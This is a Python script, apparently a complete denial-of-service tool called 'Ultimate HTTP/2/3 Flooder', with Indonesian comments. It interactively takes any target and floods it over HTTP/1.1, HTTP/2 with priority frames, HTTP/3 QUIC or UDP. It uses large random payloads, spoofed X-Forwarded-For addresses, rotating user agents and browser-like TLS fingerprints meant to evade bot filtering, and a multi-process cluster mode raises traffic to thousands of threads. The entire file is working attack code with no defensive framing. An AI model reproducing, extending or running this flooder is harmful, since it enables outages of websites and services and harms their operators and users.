#!/usr/bin/env python3
"""
Ultimate HTTP/2/3 Flooder + JA3 Spoofing + Priority Frames + QUIC
Maximum bandwidth dengan advanced techniques
"""

try:
    import os
    import sys
    import socket
    import ssl
    import threading
    import multiprocessing as mp
    import time
    import random
    import struct
    import hashlib
    from urllib.parse import urlparse, urlencode
    from concurrent.futures import ThreadPoolExecutor
    from colorama import Fore, init
    
    # HTTP/2
    try:
        import h2.connection
        import h2.config
        import h2.events
        HAS_H2 = True
    except ImportError:
        HAS_H2 = False
    
    # HTTP/3 QUIC
    try:
        import asyncio
        from aioquic.asyncio.client import connect
        from aioquic.asyncio.protocol import QuicConnectionProtocol
        from aioquic.quic.configuration import QuicConfiguration
        from aioquic.h3.connection import H3_ALPN, H3Connection
        from aioquic.h3.events import HeadersReceived, DataReceived
        HAS_H3 = True
    except ImportError:
        HAS_H3 = False

except ModuleNotFoundError as e:
    print(f"Module not installed: {e}")
    print("Install: pip3 install colorama h2 aioquic")
    sys.exit(1)

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

banner = f"""
{Fore.RED}╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗             ║
║   ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝             ║
║   ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗               ║
║   ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝               ║
║   ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗             ║
║    ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝             ║
║                                                                               ║
║        {Fore.YELLOW}HTTP/2 Priority + HTTP/3 QUIC + JA3 Spoofing + Ultra RPS{Fore.RED}           ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝

{Fore.GREEN}[+] HTTP/2: {Fore.WHITE}{'✓ Available' if HAS_H2 else '✗ pip3 install h2'}
{Fore.GREEN}[+] HTTP/3: {Fore.WHITE}{'✓ Available' if HAS_H3 else '✗ pip3 install aioquic'}
{Fore.GREEN}[+] JA3 Spoof: {Fore.WHITE}✓ Enabled
{Fore.GREEN}[+] Priority: {Fore.WHITE}✓ HTTP/2 Priority Frames
{Fore.RESET}
"""

# JA3 Cipher Suites untuk spoofing
JA3_PROFILES = {
    'chrome': {
        'ciphers': [0x1301, 0x1302, 0x1303, 0xc02b, 0xc02f, 0xc02c, 0xc030, 0xcca9, 0xcca8, 0xc013, 0xc014, 0x009c, 0x009d, 0x002f, 0x0035],
        'extensions': [0, 10, 11, 13, 16, 23, 35, 43, 45, 51],
        'curves': [29, 23, 24],
        'point_formats': [0],
    },
    'firefox': {
        'ciphers': [0x1301, 0x1302, 0x1303, 0xc02b, 0xc02f, 0xcca9, 0xcca8, 0xc02c, 0xc030, 0xc00a, 0xc009, 0xc013, 0xc014, 0x002f, 0x0035],
        'extensions': [0, 10, 11, 13, 23, 35, 43, 45, 51],
        'curves': [29, 23, 24, 25],
        'point_formats': [0],
    },
    'safari': {
        'ciphers': [0x1301, 0x1302, 0x1303, 0xc02c, 0xc02b, 0xc030, 0xc02f, 0xcca9, 0xcca8, 0xc009, 0xc00a, 0xc013, 0xc014, 0x002f, 0x0035],
        'extensions': [0, 10, 11, 13, 16, 23, 35, 43, 45, 51],
        'curves': [29, 23, 24],
        'point_formats': [0],
    }
}

class UltimateFlooder:
    def __init__(self):
        self.target = None
        self.method = "POST"
        self.threads = 500
        self.duration = 60
        self.protocol = "h1"
        self.cluster_mode = False
        self.processes = mp.cpu_count()
        self.ja3_profile = 'chrome'
        self.running = mp.Value('i', 0)
        self.request_count = mp.Value('i', 0)
        self.bytes_sent = mp.Value('i', 0)
        self.stats_lock = mp.Lock()
        
        self.default_ua = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        ]
    
    def load_file(self, filename, default):
        if os.path.exists(filename):
            try:
                with open(filename, 'r') as f:
                    return [l.strip() for l in f if l.strip() and not l.startswith('#')] or default
            except:
                pass
        return default
    
    def rand_str(self, length=10):
        return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(length))
    
    def rand_ip(self):
        return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    def setup(self):
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'https://' + self.target
        
        parsed = urlparse(self.target)
        self.scheme = parsed.scheme
        self.host = parsed.hostname
        self.port = parsed.port or (443 if self.scheme == 'https' else 80)
        self.path = parsed.path or '/'
        
        try:
            self.ip = socket.gethostbyname(self.host)
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Cannot resolve: {self.host}")
            raise
        
        self.user_agents = self.load_file('UA.txt', self.default_ua)
        
        print(f"\n{Fore.CYAN}[INFO] Target: {Fore.GREEN}{self.target}")
        print(f"{Fore.CYAN}[INFO] IP: {Fore.GREEN}{self.ip}:{self.port}")
        print(f"{Fore.CYAN}[INFO] Protocol: {Fore.GREEN}{self.protocol.upper()}")
        print(f"{Fore.CYAN}[INFO] JA3 Profile: {Fore.GREEN}{self.ja3_profile}")
        
        if self.cluster_mode:
            print(f"{Fore.CYAN}[INFO] Cluster: {Fore.GREEN}{self.processes} cores × {self.threads} threads = {self.processes * self.threads}")
    
    def create_ja3_socket(self):
        """Create socket with JA3 spoofing"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # TCP Fast Open untuk performance
            try:
                sock.setsockopt(socket.IPPROTO_TCP, 23, 5)  # TCP_FASTOPEN
            except:
                pass
            
            sock.settimeout(3)
            sock.connect((self.ip, self.port))
            
            if self.scheme == 'https':
                # JA3 Spoofing via cipher manipulation
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
                
                # Set ciphers based on JA3 profile
                profile = JA3_PROFILES[self.ja3_profile]
                cipher_names = self.get_cipher_names(profile['ciphers'])
                
                try:
                    context.set_ciphers(':'.join(cipher_names))
                except:
                    context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:!aNULL')
                
                # ALPN based on protocol
                if self.protocol == 'h2':
                    context.set_alpn_protocols(['h2', 'http/1.1'])
                elif self.protocol == 'h3':
                    context.set_alpn_protocols(['h3'])
                else:
                    context.set_alpn_protocols(['http/1.1'])
                
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            return sock
        except:
            return None
    
    def get_cipher_names(self, cipher_codes):
        """Convert cipher codes to names"""
        cipher_map = {
            0x1301: 'TLS_AES_128_GCM_SHA256',
            0x1302: 'TLS_AES_256_GCM_SHA384',
            0x1303: 'TLS_CHACHA20_POLY1305_SHA256',
            0xc02b: 'ECDHE-ECDSA-AES128-GCM-SHA256',
            0xc02f: 'ECDHE-RSA-AES128-GCM-SHA256',
            0xc02c: 'ECDHE-ECDSA-AES256-GCM-SHA384',
            0xc030: 'ECDHE-RSA-AES256-GCM-SHA384',
            0xcca9: 'ECDHE-ECDSA-CHACHA20-POLY1305',
            0xcca8: 'ECDHE-RSA-CHACHA20-POLY1305',
        }
        
        names = []
        for code in cipher_codes[:8]:  # Use first 8
            if code in cipher_map:
                names.append(cipher_map[code])
        
        return names if names else ['ECDHE+AESGCM']
    
    # ============= HTTP/1.1 =============
    
    def h1_worker(self, worker_id):
        """HTTP/1.1 worker with JA3"""
        local_count = 0
        local_bytes = 0
        
        while self.running.value:
            sock = None
            try:
                sock = self.create_ja3_socket()
                if not sock:
                    continue
                
                # 500 requests per connection
                for _ in range(500):
                    if not self.running.value:
                        break
                    
                    try:
                        ua = random.choice(self.user_agents)
                        path = f"{self.path}?_={int(time.time()*1000000)}&{self.rand_str(8)}"
                        
                        request = f"{self.method} {path} HTTP/1.1\r\n"
                        request += f"Host: {self.host}\r\n"
                        request += f"User-Agent: {ua}\r\n"
                        request += f"Accept: */*\r\n"
                        request += f"X-Forwarded-For: {self.rand_ip()}\r\n"
                        request += f"Connection: keep-alive\r\n"
                        
                        if self.method in ['POST', 'PUT', 'PATCH']:
                            # 64KB payload
                            body = ('X' * 65536).encode()
                            request += f"Content-Length: {len(body)}\r\n\r\n"
                            payload = request.encode() + body
                        else:
                            request += "\r\n"
                            payload = request.encode()
                        
                        sock.sendall(payload)
                        
                        local_count += 1
                        local_bytes += len(payload)
                        
                        try:
                            sock.settimeout(0.0001)
                            sock.recv(16384)
                        except:
                            pass
                    except:
                        break
                
                if local_count > 0:
                    with self.stats_lock:
                        self.request_count.value += local_count
                        self.bytes_sent.value += local_bytes
                    local_count = 0
                    local_bytes = 0
            except:
                pass
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
    
    # ============= HTTP/2 WITH PRIORITY =============
    
    def h2_worker(self, worker_id):
        """HTTP/2 with priority frames and multiplexing"""
        if not HAS_H2:
            return
        
        local_count = 0
        local_bytes = 0
        
        while self.running.value:
            sock = None
            h2_conn = None
            
            try:
                sock = self.create_ja3_socket()
                if not sock:
                    continue
                
                # Verify HTTP/2
                if self.scheme == 'https':
                    if sock.selected_alpn_protocol() != 'h2':
                        sock.close()
                        continue
                
                # Create H2 connection
                config = h2.config.H2Configuration(client_side=True)
                h2_conn = h2.connection.H2Connection(config=config)
                h2_conn.initiate_connection()
                
                # Update window size for performance
                h2_conn.increment_flow_control_window(15663105)  # Max window
                
                sock.sendall(h2_conn.data_to_send())
                
                # Send 256 concurrent streams with priority
                for stream_id in range(1, 513, 2):  # 256 streams
                    if not self.running.value:
                        break
                    
                    try:
                        # Send PRIORITY frame
                        priority_weight = random.randint(1, 256)
                        h2_conn.prioritize(stream_id, weight=priority_weight)
                        
                        # Headers
                        headers = [
                            (':method', self.method),
                            (':scheme', self.scheme),
                            (':authority', self.host),
                            (':path', f"{self.path}?s={stream_id}&_{int(time.time()*1000000)}"),
                            ('user-agent', random.choice(self.user_agents)),
                            ('x-forwarded-for', self.rand_ip()),
                        ]
                        
                        h2_conn.send_headers(stream_id, headers)
                        
                        # Send body for POST/PUT/PATCH
                        if self.method in ['POST', 'PUT', 'PATCH']:
                            # 64KB per stream
                            body = os.urandom(65536)
                            h2_conn.send_data(stream_id, body)
                            local_bytes += len(body)
                        
                        h2_conn.end_stream(stream_id)
                        
                        # Flush every 16 streams
                        if stream_id % 32 == 1:
                            data = h2_conn.data_to_send()
                            if data:
                                sock.sendall(data)
                                local_bytes += len(data)
                        
                        local_count += 1
                        
                    except:
                        break
                
                # Final flush
                try:
                    data = h2_conn.data_to_send()
                    if data:
                        sock.sendall(data)
                        local_bytes += len(data)
                except:
                    pass
                
                if local_count > 0:
                    with self.stats_lock:
                        self.request_count.value += local_count
                        self.bytes_sent.value += local_bytes
                    local_count = 0
                    local_bytes = 0
                
            except:
                pass
            finally:
                if h2_conn:
                    try:
                        h2_conn.close_connection()
                        sock.sendall(h2_conn.data_to_send())
                    except:
                        pass
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
    
    # ============= HTTP/3 QUIC =============
    
    async def h3_single_connection(self):
        """Single HTTP/3 QUIC connection with multi-stream"""
        if not HAS_H3:
            return
        
        try:
            configuration = QuicConfiguration(
                is_client=True,
                alpn_protocols=H3_ALPN,
            )
            configuration.verify_mode = ssl.CERT_NONE
            
            async with connect(
                self.host,
                self.port,
                configuration=configuration,
            ) as protocol:
                
                # Send 100 concurrent streams
                for i in range(100):
                    if not self.running.value:
                        break
                    
                    stream_id = protocol._quic.get_next_available_stream_id()
                    
                    headers = [
                        (b":method", self.method.encode()),
                        (b":scheme", self.scheme.encode()),
                        (b":authority", self.host.encode()),
                        (b":path", f"{self.path}?q={i}&_{int(time.time()*1000)}".encode()),
                        (b"user-agent", random.choice(self.user_agents).encode()),
                    ]
                    
                    # Send request
                    protocol._http.send_headers(stream_id=stream_id, headers=headers)
                    
                    if self.method in ['POST', 'PUT', 'PATCH']:
                        body = os.urandom(32768)
                        protocol._http.send_data(stream_id=stream_id, data=body, end_stream=True)
                    else:
                        protocol._http.send_data(stream_id=stream_id, data=b"", end_stream=True)
                    
                    with self.stats_lock:
                        self.request_count.value += 1
                        self.bytes_sent.value += 32768
                
        except:
            pass
    
    def h3_worker(self, worker_id):
        """HTTP/3 worker wrapper"""
        if not HAS_H3:
            return
        
        while self.running.value:
            try:
                asyncio.run(self.h3_single_connection())
            except:
                pass
    
    # ============= UDP =============
    
    def udp_worker(self, worker_id):
        """UDP flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        local_count = 0
        local_bytes = 0
        
        while self.running.value:
            try:
                data = os.urandom(65507)
                sock.sendto(data, (self.ip, self.port))
                
                local_count += 1
                local_bytes += len(data)
                
                if local_count >= 500:
                    with self.stats_lock:
                        self.request_count.value += local_count
                        self.bytes_sent.value += local_bytes
                    local_count = 0
                    local_bytes = 0
            except:
                pass
    
    # ============= CLUSTER =============
    
    def cluster_process(self, process_id):
        """Cluster process"""
        worker_map = {
            'h1': self.h1_worker,
            'h2': self.h2_worker,
            'h3': self.h3_worker,
            'udp': self.udp_worker,
        }
        
        worker_func = worker_map.get(self.protocol, self.h1_worker)
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(worker_func, i) for i in range(self.threads)]
            
            while self.running.value:
                time.sleep(1)
    
    # ============= STATS =============
    
    def stats_worker(self):
        """Real-time stats"""
        start = time.time()
        last_count = 0
        last_bytes = 0
        
        while self.running.value:
            time.sleep(1)
            elapsed = time.time() - start
            
            with self.stats_lock:
                count = self.request_count.value
                total_bytes = self.bytes_sent.value
            
            diff_count = count - last_count
            diff_bytes = total_bytes - last_bytes
            
            rps = diff_count
            mbps = (diff_bytes * 8) / (1024 * 1024)
            
            last_count = count
            last_bytes = total_bytes
            
            print(f"{Fore.CYAN}[{int(elapsed)}s] {Fore.WHITE}Req: {Fore.GREEN}{count:,} {Fore.WHITE}| RPS: {Fore.GREEN}{rps:,} {Fore.WHITE}| BW: {Fore.GREEN}{mbps:.1f} Mbps {Fore.WHITE}| Sent: {Fore.GREEN}{total_bytes/1048576:.0f} MB")
    
    # ============= START =============
    
    def start(self):
        try:
            self.setup()
        except:
            return
        
        self.running.value = 1
        
        print(f"\n{Fore.RED}{'='*100}")
        print(f"{Fore.RED}[STARTING] {self.protocol.upper()} FLOOD")
        print(f"{Fore.RED}{'='*100}\n")
        
        stats_thread = threading.Thread(target=self.stats_worker, daemon=True)
        stats_thread.start()
        
        if self.cluster_mode:
            processes = []
            for i in range(self.processes):
                p = mp.Process(target=self.cluster_process, args=(i,))
                p.start()
                processes.append(p)
                time.sleep(0.02)
            
            print(f"{Fore.GREEN}[CLUSTER] {self.processes * self.threads} threads running!\n")
            
            try:
                time.sleep(self.duration)
            except KeyboardInterrupt:
                pass
            
            self.running.value = 0
            
            for p in processes:
                p.join(timeout=2)
                if p.is_alive():
                    p.terminate()
        else:
            worker_map = {
                'h1': self.h1_worker,
                'h2': self.h2_worker,
                'h3': self.h3_worker,
                'udp': self.udp_worker,
            }
            
            worker_func = worker_map.get(self.protocol, self.h1_worker)
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [executor.submit(worker_func, i) for i in range(self.threads)]
                
                print(f"{Fore.GREEN}[RUNNING] {self.threads} threads!\n")
                
                try:
                    time.sleep(self.duration)
                except KeyboardInterrupt:
                    pass
                
                self.running.value = 0
        
        time.sleep(2)
        
        with self.stats_lock:
            final_count = self.request_count.value
            final_bytes = self.bytes_sent.value
        
        print(f"\n{Fore.YELLOW}{'='*100}")
        print(f"{Fore.CYAN}RESULTS")
        print(f"{Fore.YELLOW}{'='*100}")
        print(f"{Fore.WHITE}Requests: {Fore.GREEN}{final_count:,}")
        print(f"{Fore.WHITE}Sent: {Fore.GREEN}{final_bytes/1048576:.2f} MB")
        if self.duration > 0:
            print(f"{Fore.WHITE}Avg RPS: {Fore.GREEN}{final_count/self.duration:.0f}")
            print(f"{Fore.WHITE}Avg BW: {Fore.GREEN}{(final_bytes*8)/(self.duration*1048576):.2f} Mbps")
        print(f"{Fore.YELLOW}{'='*100}")

def main():
    clear()
    print(banner)
    
    try:
        choice = input(f"{Fore.YELLOW}[?] Start? (Y/n) > {Fore.CYAN}").strip().lower()
        if choice == 'n':
            sys.exit(0)
        
        print(f"\n{Fore.GREEN}{'='*100}\nCONFIG\n{'='*100}\n")
        
        tester = UltimateFlooder()
        
        tester.target = input(f"{Fore.YELLOW}[>] {Fore.GREEN}TARGET > {Fore.CYAN}").strip()
        if not tester.target:
            return
        
        method = input(f"{Fore.YELLOW}[>] {Fore.GREEN}METHOD (POST/GET/UDP) > {Fore.CYAN}").strip().upper()
        tester.method = method if method else 'POST'
        
        if tester.method not in ['UDP']:
            proto = input(f"{Fore.YELLOW}[>] {Fore.GREEN}PROTOCOL (h1/h2/h3) > {Fore.CYAN}").strip().lower()
            tester.protocol = proto if proto in ['h1', 'h2', 'h3'] else 'h1'
            
            ja3 = input(f"{Fore.YELLOW}[>] {Fore.GREEN}JA3 (chrome/firefox/safari) > {Fore.CYAN}").strip().lower()
            tester.ja3_profile = ja3 if ja3 in ['chrome', 'firefox', 'safari'] else 'chrome'
        else:
            tester.protocol = 'udp'
        
        threads = input(f"{Fore.YELLOW}[>] {Fore.GREEN}THREADS (500) > {Fore.CYAN}").strip()
        tester.threads = int(threads) if threads else 500
        
        duration = input(f"{Fore.YELLOW}[>] {Fore.GREEN}DURATION (60) > {Fore.CYAN}").strip()
        tester.duration = int(duration) if duration else 60
        
        cluster = input(f"{Fore.YELLOW}[>] {Fore.GREEN}CLUSTER (Y/n) > {Fore.CYAN}").strip().lower()
        tester.cluster_mode = cluster == 'y'
        
        tester.start()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Stopped")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}")

if __name__ == "__main__":
    main()